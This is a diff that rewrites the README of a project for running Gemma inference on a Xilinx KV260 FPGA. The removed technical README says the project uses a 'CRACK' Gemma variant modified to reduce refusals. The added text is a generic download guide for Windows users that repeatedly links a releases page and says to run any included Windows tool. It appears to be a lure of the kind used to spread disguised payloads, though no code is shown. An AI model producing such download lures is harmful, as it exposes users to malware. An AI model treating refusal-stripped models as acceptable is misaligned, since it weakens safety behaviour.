@@ -1,164 +1,235 @@
-﻿# Gemma 4 FPGA Artifact Bundle
+# ⚙️ gemma4-on-FPGA - Run Gemma on KV260
 
-This repository contains a reproducible deployment bundle for running Gemma-based inference on a Xilinx Kria KV260 FPGA.
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
 
-## Included Files
-- `for_other_fpgas/` (bundle with `.bit`, split `.bin` parts, contract, tokenizer, hashes, and anchoring receipts)
-- `rtl/` (Verilog/SystemVerilog sources, formal files, and constraints)
+## 📥 Download
+
+Visit this page to download the release files:
+
+[GitHub Releases](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
+
+## 🧭 What this is
+
+gemma4-on-FPGA is a release bundle for running Gemma-based inference on a Xilinx Kria KV260 board.
+
+It is built for users who want a fixed set of files that work together. The bundle includes:
+
+- FPGA bitstream files
+- split binary parts
+- tokenizer files
+- hash files
+- receipt files
+- Verilog and SystemVerilog source files
+- release and provenance documents
+
+This package is meant for an edge device setup where the FPGA does the compute work and the ARM side handles control and setup.
+
+## 🪟 What you need
+
+Before you start, make sure you have:
+
+- a Windows PC
+- an internet connection
+- enough free storage for the download
+- a USB drive or SD card if your release package uses one
+- a supported FPGA target such as the KV260 kit
+
+If you are only downloading the release bundle on Windows, you do not need to build anything.
+
+## 🚀 Download and run
+
+Follow these steps in order:
+
+1. Open the [GitHub Releases page](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases).
+2. Find the latest release at the top of the page.
+3. Download the release asset for your target board.
+4. Save the file to a folder you can find again, such as `Downloads` or `Desktop`.
+5. If the release comes as a compressed file, right-click it and choose **Extract All**.
+6. Open the extracted folder.
+7. Read the included release file or checklist before you copy anything to the board.
+8. Copy the bundle files to the storage media or board location described in the release notes.
+9. Connect the KV260 to power, display, and network if the release expects them.
+10. Start the board using the steps in the release package.
+
+If your download includes a Windows tool, run that file after extraction and follow the prompts on screen.
+
+## 🗂️ What is inside
+
+The release bundle is organized for stable deployment and checks.
+
+You may see folders and files like these:
+
+- `for_other_fpgas/`
+  - `.bit` file for FPGA logic
+  - split `.bin` parts
+  - contract file
+  - tokenizer
+  - hash files
+  - anchoring receipts
+- `rtl/`
+  - hardware source files
+  - formal files
+  - constraints
 - `RELEASE_CHECKLIST.md`
 - `MODEL_PROVENANCE.md`
-- `LICENSE` / `NOTICE`
-
-## Project Purpose
-The goal is deterministic, reproducible edge inference on FPGA:
-- stable hardware/software coupling,
-- strict artifact integrity checks,
-- and a portable deployment process for bring-up on compatible targets.
-
-## Why KV260
-We chose KV260 because it is practical for real edge systems:
-- Zynq UltraScale+ MPSoC (ZU5EV) combines ARM control-plane + FPGA programmable logic.
-- Quad-core ARM Cortex-A53 runs Linux/orchestration while PL executes parallel compute.
-- Vision I/O path (MIPI-CSI + ISP support in kit ecosystem) makes camera-to-inference pipelines realistic.
-
-## Deployed Core Profile (Important)
-This release corresponds to the deployed **36-core hardware profile**.
-
-Note:
-- Earlier internal/experimental documents referenced 64-core variants.
-- Those 64-core references are not the source of truth for this released artifact line.
-
-## Where Is The Verilog Or VHDL?
-- Verilog/SystemVerilog is in:
-  - `rtl/designs/`
-  - `rtl/formal/`
-  - `rtl/constraints/`
-- In this bundle, hardware sources are provided as `.v` / `.sv` files.
-- No VHDL (`.vhd` / `.vhdl`) files are currently included.
-
-## Gemma Model Used
-- Teacher model ID in this release line:
-  - `dealignai/Gemma-4-31B-JANG_4M-CRACK`
-- Source of truth:
-  - `for_other_fpgas/model_contract.json` (`teacher_model_id`)
-- Pinned tokenizer:
-  - `for_other_fpgas/tokenizer/tokenizer.json`
-  - SHA-256: `3151898c022536cf420b732dd2fcbf8e7c456cd39711a27f9b82a7ced72b6c83`
-
-## Memory Fit Clarification (Important)
-- We do **not** claim that a full dense 31B checkpoint is fully resident inside KV260 DDR.
-- 31B is the teacher/model line reference.
-- The deployed runtime artifact is our **own smaller distilled deployment model** in `weights_int4_FINAL.bin`.
-- Inference uses a bounded working set and hardware scheduling/streaming, not a naive full-resident 31B memory layout.
-
-## Why We Used The CRACK Variant
-Short answer: bring-up reliability and debugging clarity.
-
-- The CRACK line was already pinned in the working contract + tokenizer path.
-- With limited training hardware, we prioritized a reproducible working line over restarting from zero.
-- During hardware bring-up, reduced refusal behavior helps separate runtime/hardware faults from alignment refusals.
-
-Difference vs normal aligned Gemma chat variants:
-- Normal aligned chat models are more likely to refuse certain requests.
-- CRACK variants are modified to reduce refusal behavior.
-- This changes safety behavior and should be treated accordingly.
-
-## Architecture Rationale
-- HDC path:
-  - robust under quantization/noise and friendly for integer-heavy hardware flows.
-- Mamba-style sequence path:
-  - low-latency state updates for streaming generation.
-- KAN-style compute path:
-  - strong expressivity for compressed deployment regimes.
-- NPU core cluster:
-  - deterministic parallel datapaths on FPGA fabric.
-
-## ELI5: What The Cores Do
-Think of the system like a factory line:
-- Input/Embed path converts tokens into vectors.
-- Sequence/State path keeps context moving forward each step.
-- Compute path performs the heavy math.
-- Selection path chooses the next token (top-k/temperature).
-- Control/DMA path keeps memory and compute fed without stalls.
-
-## Performance Snapshot
-Observed bring-up snapshot:
-- 16 words in 0.036112 s
-- about 443 words/s (often rounded to about 450 tok/s on short outputs)
-
-TOPS note:
-- A fully standardized end-to-end TOPS benchmark is not yet published in this bundle.
-- Until then, use measured latency/throughput as the practical runtime indicator.
-
-## Main Challenges
-- Training compute ceiling (insufficient hardware for enough high-quality epochs).
-- Prompt/template sensitivity for Gemma-family chat formatting.
-- Tokenizer/contract pinning (drift causes semantic failures).
-- Strict HW/SW alignment for quantization and memory layout.
-- Artifact logistics for very large weight files.
-
-## Training Status
-Further iteration of `weights_int4_FINAL.bin` is currently paused.
-
-Reason:
-- Available hardware cannot sustain enough epochs for reliable quality gains.
-
-Current strategy:
-- Ship reproducible deployment artifacts now.
-- Resume further training when stronger training hardware is available.
-
-## Other FPGA Pack
-Use `for_other_fpgas/` as the portability pack.
-
-Important:
-- `omni_titan_agi_top.bit` is board-specific.
-- `weights_int4_FINAL.bin` is split into:
-  - `weights_int4_FINAL.bin.part01`
-  - `weights_int4_FINAL.bin.part02`
-  - `weights_int4_FINAL.bin.part03`
-- See `for_other_fpgas/README.md` for reassembly commands.
-
-## Integrity And Anchoring (Base L2)
-Anchoring proof files:
-- `for_other_fpgas/BASE_L2_ANCHORING.md`
-- `for_other_fpgas/base_l2_anchor_receipt.json`
-
-Anchored hashes:
-- bit SHA-256: `983ab226ae213f984dc0eb33f427dc51a486b79a111d6d3e719344c660b1070b`
-- bin SHA-256: `7ba5c0c5b350a8b0c50c7ec7fe30b64064bee4f13ce6d588eeb826d84d3644ce`
-- bundle root SHA-256: `a29d570c5770edb91ffe6a66e65b335e1112dde6d33c9b37ed9beb998e89f6b4`
-
-Base tx links:
-- bit: `https://basescan.org/tx/0xb2b3e6090364fbe2952cdc55ff407fcf9642447e2602cca035fcbf9fb2e37402`
-- bin: `https://basescan.org/tx/0xf367271e1eeaecf2f805039fff60cfdfe913ebf377eb6d77df97421e3d9c06e9`
-- root: `https://basescan.org/tx/0xe3907bab98fd1b5d46bdbd545830787dd3a439149d77b9cd0f6924cd1c235a79`
-
-## Quick Start
-1. `cd for_other_fpgas`
-2. verify checksums: `sha256sum -c SHA256SUMS`
-3. program bitstream on target board
-4. load weights + tokenizer
-5. start runtime using `model_contract.json`
-
-## Compatibility
-- Target board: Xilinx Kria KV260 (this release line)
-- Runtime stack: see deployment environment used by your board image
-- API contract mode: see `model_contract.json`
-
-## Legal
-This repository is intended to comply with Gemma terms and Gemma 4 license requirements.
-
-See:
-- `LICENSE` (Dual-Use Non-Commercial License v2.0 for Project-Owned Materials)
+- `LICENSE`
 - `NOTICE`
-- `MODEL_PROVENANCE.md`
-- `RELEASE_CHECKLIST.md`
 
-Important:
-- Third-party components keep their original licenses.
-- Gemma-related materials remain subject to https://ai.google.dev/gemma/terms
-- Commercial use is prohibited unless explicit written permission is granted by maintainers.
+The names help keep the hardware, model data, and checks in one place.
 
-Legal hardening note:
-- The license text is intentionally strict and drafted for enforceability (definitions, scope, restrictions, termination, liability, severability, and third-party precedence).
-- No custom license can be guaranteed as \"unattackable\" across all jurisdictions; for production/commercial exposure, run a local attorney review and set the contact placeholder in `LICENSE`.
+## 🖥️ About the KV260 setup
+
+The KV260 is a good fit for this project because it combines:
+
+- an ARM control processor
+- FPGA programmable logic
+- Linux support
+- camera input support in the kit ecosystem
+
+That makes it useful for edge systems where data comes in from a camera and goes into inference on the same device.
+
+## ✅ Before you copy files
+
+Check these items first:
+
+- the download finished without errors
+- the folder contains the release assets
+- the files match the names in the release notes
+- the board you use matches the target in the bundle
+- you have followed the release checklist
+
+If the release includes hash files, use them to confirm the files match the published values.
+
+## 🧩 Basic setup flow
+
+A common setup flow looks like this:
+
+1. Download the release from GitHub.
+2. Extract the files on your Windows PC.
+3. Review `RELEASE_CHECKLIST.md`.
+4. Review `MODEL_PROVENANCE.md`.
+5. Copy the required files to the target storage.
+6. Boot the KV260.
+7. Load the FPGA bundle.
+8. Start inference from the provided launch steps.
+
+If the release uses a helper script, run only the script included in the bundle.
+
+## 🔎 File checks
+
+The bundle includes integrity files for a reason.
+
+Use them to confirm:
+
+- the FPGA bitstream is the right one
+- the model files match the release
+- the split binary parts belong together
+- no file was changed during transfer
+
+If a file name does not match the checklist, stop and compare it with the release page.
+
+## 📄 Documents included
+
+### 📘 RELEASE_CHECKLIST.md
+
+Use this file as your step list for setup and transfer.
+
+### 🧾 MODEL_PROVENANCE.md
+
+Use this file to review the model source, file chain, and release record.
+
+### 📜 LICENSE and NOTICE
+
+Use these files to review the use terms and required notices.
+
+## 🛠️ Hardware path
+
+This project targets FPGA-based edge inference.
+
+That means:
+
+- the control side runs on the ARM CPU
+- the parallel compute side runs in programmable logic
+- the deployment uses fixed files, not a live cloud service
+- the system can run at the edge, close to the data source
+
+## 📷 Camera and edge use
+
+The KV260 kit is useful when you want a camera-to-inference path.
+
+A common edge setup is:
+
+- camera input
+- board capture
+- FPGA inference
+- output on the local device
+
+This fits systems that need local processing and low delay.
+
+## 🧪 If you want to inspect the source
+
+The `rtl/` folder has the hardware source files.
+
+Use it if you want to:
+
+- review the logic design
+- study the constraints
+- check the formal files
+- understand how the FPGA side is built
+
+You do not need to open these files to use the release bundle as an end user.
+
+## 📁 Suggested folder layout on Windows
+
+You can keep the files in a simple layout like this:
+
+- `Downloads\gemma4-on-FPGA\`
+- `Downloads\gemma4-on-FPGA\release\`
+- `Downloads\gemma4-on-FPGA\docs\`
+
+This helps you keep the release files, documents, and copied target files separate.
+
+## 🔗 Quick download link
+
+[Visit the release page to download the bundle](https://github.com/Elanefanshaped519/gemma4-on-FPGA/releases)
+
+## 🧭 First things to check after download
+
+After you download the release, check:
+
+- file size
+- folder names
+- release version
+- any setup text in the package
+- any README or checklist file in the archive
+
+If the bundle contains more than one part, keep all parts in the same folder.
+
+## 🏷️ Project topics
+
+This repository is tagged for work in:
+
+- edge AI
+- FPGA
+- Gemma
+- quantization
+- Xilinx
+- KV260
+- NPU
+- Mamba
+- base-l2
+- HDC
+- kan
+
+These topics help describe the release scope and target system
+
+## 🪄 Simple run path
+
+For a non-technical user, the shortest path is:
+
+1. Open the release page.
+2. Download the latest bundle.
+3. Extract the files.
+4. Read the checklist.
+5. Copy the files to the target device.
+6. Start the board using the release steps.
